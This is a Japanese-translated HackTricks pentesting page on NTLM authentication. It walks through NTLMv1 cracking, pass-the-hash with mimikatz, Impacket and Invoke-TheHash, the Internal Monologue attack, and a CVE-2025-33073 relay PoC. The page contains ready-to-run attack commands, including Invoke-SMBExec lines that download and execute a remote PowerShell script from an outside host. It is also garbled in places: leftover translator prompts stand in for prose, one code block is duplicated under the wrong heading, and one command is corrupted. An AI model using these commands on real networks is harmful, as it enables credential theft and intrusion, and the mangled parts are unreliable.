# NTLM

{{#include ../../banners/hacktricks-training.md}}


## 基本情報

**Windows XP および Server 2003** が稼働している環境では、LM（Lan Manager）hash が使用されますが、これらが容易に compromise されることは広く知られています。特定の LM hash `AAD3B435B51404EEAAD3B435B51404EE` は、LM が使用されていないことを示し、空の文字列に対する hash を表します。

デフォルトでは、**Kerberos** authentication protocol が主要な方法として使用されます。NTLM（NT LAN Manager）は、Active Directory が存在しない場合、domain が存在しない場合、設定不備によって Kerberos が正常に動作しない場合、または有効な hostname ではなく IP address を使用して接続を試行した場合など、特定の状況で使用されます。

network packet 内に **"NTLMSSP"** header が存在する場合、NTLM authentication process が行われていることを示します。

authentication protocol である LM、NTLMv1、NTLMv2 のサポートは、`%windir%\Windows\System32\msv1\_0.dll` に存在する特定の DLL によって提供されます。

**主なポイント**:

- LM hash は脆弱であり、空の LM hash（`AAD3B435B51404EEAAD3B435B51404EE`）は LM が使用されていないことを示します。
- Kerberos がデフォルトの authentication method であり、NTLM は特定の条件下でのみ使用されます。
- NTLM authentication packet は、"NTLMSSP" header によって識別できます。
- LM、NTLMv1、NTLMv2 protocol は、system file `msv1\_0.dll` によってサポートされています。

## LM、NTLMv1、NTLMv2

使用される protocol の確認および設定が可能です。

### GUI

_secpol.msc_ を実行 -> Local policies -> Security Options -> Network Security: LAN Manager authentication level。level は 0 から 5 までの 6 段階です。

![LM、NTLMv1、NTLMv2 - GUI: secpol.msc を実行 - Local policies - Security Options - Network Security: LAN Manager authentication level。level は 0 から 5 までの 6 段階です](<../../images/image (919).png>)

### Registry

これにより level 5 が設定されます。
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
指定可能な値:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## 基本的な NTLM Domain authentication Scheme

1. **user** が自身の **credentials** を入力する
2. client machine が **domain name** と **username** を送信して、**authentication request** を送信する
3. server が **challenge** を送信する
4. **client** が password の hash を key として使用し、**challenge** を **encrypt** して response として送信する
5. **server** が **domain name、username、challenge、response** を **Domain controller** に送信する。**Active Directory** が構成されていない場合、または domain name が server の名前である場合、**credentials** は **locally** 検証される。
6. **domain controller** がすべて正しいかを確認し、その情報を server に送信する

**server** と **Domain Controller** は、**Netlogon** server 経由で **Secure Channel** を作成できる。これは Domain Controller が server の password を認識しているためである（password は **NTDS.DIT** db 内に存在する）。

### Local NTLM authentication Scheme

authentication は前述のものと同じだが、**server** は **SAM** file 内に、認証を試行している **user** の **hash** を保持している。そのため、Domain Controller に問い合わせる代わりに、**server** 自身が user の authentication が可能かを確認する。

### NTLMv1 Challenge

**challenge length is 8 bytes** で、**response is 24 bytes** である。

**hash NT (16bytes)** は **3 parts of 7bytes each**（7B + 7B + (2B+0x00\*5)）に分割される：**last part is filled with zeros**。次に、**challenge** は各 part で個別に **ciphered** され、**resulting** ciphered bytes が **joined** される。合計：8B + 8B + 8B = 24Bytes。

**Problems**:

- **randomness** の欠如
- 3 つの parts は個別に **attacked** でき、NT hash を見つけられる
- **DES is crackable**
- 3º key は常に **5 zeros** で構成される。
- 同じ **challenge** が与えられると、**response** も **same** になる。そのため、被害者への **challenge** として文字列 "**1122334455667788**" を与え、**precomputed rainbow tables** を使用して response を攻撃できる。

### NTLMv1 attack

Nowadays、Unconstrained Delegation が構成された環境を見つけることは少なくなっているが、これは構成された **Print Spooler service** を **abuse** できないという意味ではない。

AD 上ですでに保有している credentials/sessions を **abuse** して、プリンターに **authentication** を **host under your control** に対して行わせることができる。その後、`metasploit auxiliary/server/capture/smb` または `responder` を使用して、**authentication challenge** を 1122334455667788 に設定し、authentication attempt を capture する。NTLMv1 を使用して行われた場合は、**crack it** できる。\
`responder` を使用している場合は、**flag `--lm`** を **use** して **authentication** の **downgrade** を試行できる。\
_Note that for this technique the authentication must be performed using NTLMv1 (NTLMv2 is not valid)._

プリンターは authentication 中に computer account を使用することに注意すること。computer accounts は **long and random passwords** を使用するため、一般的な **dictionaries** では **probably won't be able to crack**。ただし、**NTLMv1** authentication は **DES**（[more info here](#ntlmv1-challenge)）を使用するため、DES の cracking に特化した services を使用すれば crack できる（例えば [https://crack.sh/](https://crack.sh) または [https://ntlmv1.com/](https://ntlmv1.com) を使用できる）。

### NTLMv1 attack with hashcat

NTLMv1 は、NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) を使用して break することもできる。この tool は NTLMv1 messages を、hashcat で break できる method に formats する。<sup>[[1]](#references)</sup>

The command
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
翻訳対象の本文を貼り付けてください。
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Please provide the file name and its contents.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
hashcatを実行します（分散処理はhashtopolisなどのtoolを介するのが最適です）。そうしない場合、これには数日かかります。
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
この場合、これのパスワードが password だと分かっているため、デモ目的でチートします：
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
ここでは、hashcat-utilitiesを使用して、cracked des keysをNTLM hashの一部に変換する必要があります:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
翻訳する本文を送ってください。
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
翻訳するテキストを送ってください。
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**challenge の長さは 8 bytes** で、**2 つの response が送信されます**。1 つは **24 bytes** で、もう 1 つの長さは **可変** です。

**最初の response** は、**client と domain で構成された文字列**を、**NT hash の MD4 hash**を**key**として **HMAC_MD5** で暗号化することで作成されます。次に、その**結果を key**として **challenge** を **HMAC_MD5** で暗号化します。これに **8 bytes の client challenge** が追加されます。合計: 24 B。

**2 番目の response** は、複数の値（新しい client challenge、**replay attacks** を防ぐための **timestamp** など）を使用して作成されます。

**successful authentication process をキャプチャした pcap** がある場合は、この guide に従って domain、username、challenge、response を取得し、password の **crack** を試行できます: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)<sup>[[2]](#references)</sup>

## Pass-the-Hash

**victim の hash を取得したら**、それを使用して victim に**なりすます**ことができます。\
その hash を使用して **NTLM authentication を実行する** **tool** を使用する必要があります。または、新しい **sessionlogon** を作成して、その **hash** を **LSASS** 内に **inject** することもできます。これにより、**NTLM authentication が実行されるたびに、その hash が使用されます。** 後者の方法が mimikatz の動作です。

**Computer accounts を使用して Pass-the-Hash attacks を実行することもできる点に注意してください。**

### **Mimikatz**

**administrator として実行する必要があります**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
これは、mimikatzを起動したユーザーの権限でプロセスを起動しますが、LSASS内部に保存される認証情報はmimikatzのパラメータ内のものになります。その後、平文パスワードを知る必要なく、そのユーザーであるかのようにネットワークリソースへアクセスできます（`runas /netonly`のトリックに似ています）。

### Pass-the-Hash from linux

LinuxからPass-the-Hashを使用して、Windowsマシン上でcode executionを取得できます。\
[**方法についてはこちらを参照してください。**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows compiled tools

[ここからWindows用のimpacket binariesをダウンロードできます](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries)。

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe**（この場合はcommandを指定する必要があります。cmd.exeとpowershell.exeではinteractive shellを取得できません）`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Impacket binariesは他にもいくつかあります...

### Invoke-TheHash

PowerShell scriptsはここから取得できます：[https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

この function は**他のすべての function を組み合わせたもの**です。**複数の host**を指定し、一部を**除外**して、使用する**option**（_SMBExec、WMIExec、SMBClient、SMBEnum_）を**選択**できます。**SMBExec**または**WMIExec**のいずれかを選択しても、_**Command**_ parameter を指定しなければ、**十分な permissions があるか**を**確認**するだけです。
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**administratorとして実行する必要があります**

このtoolはmimikatzと同じ処理を行います（LSASSメモリを変更します）。
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### username と password を使った Windows remote execution の手動実行


{{#ref}}
../lateral-movement/
{{#endref}}

## Windows Host からの credentials の抽出

**詳しい情報については、** [**Windows host から credentials を取得する方法について、このページを読んでください**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**。**

## Internal Monologue attack

Internal Monologue Attack は、**LSASS process と直接やり取りすることなく**、被害者の machine から NTLM hashes を取得できる、ステルス性の高い credential extraction technique です。memory から hashes を直接読み取り、endpoint security solutions や Credential Guard によって頻繁に block される Mimikatz とは異なり、この attack は **Security Support Provider Interface (SSPI) 経由で NTLM authentication package (MSV1_0) への local calls** を利用します。まず attacker は、NetNTLMv1 が許可されるように **NTLM settings**（例: LMCompatibilityLevel、NTLMMinClientSec、RestrictSendingNTLMTraffic）を **downgrade** します。その後、running processes から取得した既存の user tokens を impersonate し、local で NTLM authentication を trigger して、既知の challenge を使用した NetNTLMv1 responses を生成します。<sup>[[4]](#references)</sup>

これらの NetNTLMv1 responses を capture した後、attacker は **precomputed rainbow tables** を使って元の NTLM hashes を迅速に recover でき、lateral movement のためのさらなる Pass-the-Hash attacks が可能になります。重要なのは、Internal Monologue Attack が network traffic を生成せず、code を inject せず、直接的な memory dumps も trigger しないため、ステルス性を維持できる点です。そのため、Mimikatz のような traditional methods と比較して defenders による detection が困難です。

強制された security policies により NetNTLMv1 が受け入れられない場合、attacker は NetNTLMv1 response の取得に失敗する可能性があります。

このケースに対応するため、Internal Monologue tool は update されました。`AcceptSecurityContext()` を使って server token を動的に取得し、NetNTLMv1 が失敗した場合でも **NetNTLMv2 responses を capture** できるようになっています。NetNTLMv2 は crack がはるかに困難ですが、relay attacks や、限定的なケースでは offline brute-force への道を依然として開きます。

PoC は **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)** にあります。<sup>[[4]](#references)</sup>

## NTLM Relay と Responder

**これらの attacks の実行方法について、より詳しい guide は以下を読んでください:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## network capture から NTLM challenges を parse する

**以下を使用できます:** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM と Kerberos の *Reflection*（Serialized SPNs 経由、CVE-2025-33073）

Windows には、host から発生した NTLM（または Kerberos）authentication を **同じ** host に relay して SYSTEM privileges を取得する *reflection* attacks を防ごうとする、複数の mitigations が含まれています。

Microsoft は MS08-068 (SMB→SMB)、MS09-013 (HTTP→SMB)、MS15-076 (DCOM→DCOM) およびその後の patches によって、ほとんどの public chains を破棄しました。しかし **CVE-2025-33073** は、**marshalled**（serialized）target-info を含む *Service Principal Names (SPNs)* を **SMB client が truncate する**仕組みを悪用することで、protections を依然として bypass できることを示しています。<sup>[[5]](#references)[[6]](#references)</sup>

### TL;DR of the bug
1. attacker が marshalled SPN を encode した label を持つ **DNS A-record** を register します。例:
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. victim がその hostname へ authenticate するように coerce されます（PetitPotam、DFSCoerce など）。
3. SMB client が target string `cifs/srv11UWhRCAAAAA…` を `lsasrv!LsapCheckMarshalledTargetInfo` に渡すと、`CredUnmarshalTargetInfo` の call が **serialized blob を strip** し、**`cifs/srv1`** を残します。
4. これにより `msv1_0!SspIsTargetLocalhost`（または Kerberos の equivalent）は、short host part が computer name（`SRV1`）と一致するため、target を *localhost* と見なします。
5. その結果、server は `NTLMSSP_NEGOTIATE_LOCAL_CALL` を set し、**LSASS の SYSTEM access-token** を context に inject します（Kerberos の場合は SYSTEM-marked subsession key が作成されます）。
6. `ntlmrelayx.py` **または** `krbrelayx.py` でその authentication を relay すると、同じ host 上で full SYSTEM rights を取得できます。<sup>[[5]](#references)</sup>

### Quick PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Patch & Mitigations
* **CVE-2025-33073** の KB patch は、`mrxsmb.sys::SmbCeCreateSrvCall` にチェックを追加し、target に marshalled info (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`) が含まれる SMB connection をブロックします。<sup>[[5]](#references)[[6]](#references)</sup>
* 未適用の host でも reflection を防ぐため、**SMB signing** を強制します。
* `*<base64>...*` に類似した DNS records を監視し、coercion vectors (PetitPotam、DFSCoerce、AuthIP...) をブロックします。

### Detection ideas
* client IP ≠ server IP の `NTLMSSP_NEGOTIATE_LOCAL_CALL` を含む network captures。
* subsession key と hostname に等しい client principal を含む Kerberos AP-REQ。
* Windows Event 4624/4648 の SYSTEM logons に続いて、同じ host から remote SMB writes が発生する場合。<sup>[[5]](#references)</sup>

**March 2026** の、**SMB arbitrary ports** と **TCP connection reuse** を悪用して `NT AUTHORITY\SYSTEM` に到達する local reflection variant については、以下を参照してください。

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [2] [Cracking an NTLMv2 Hash](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash Utilities](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
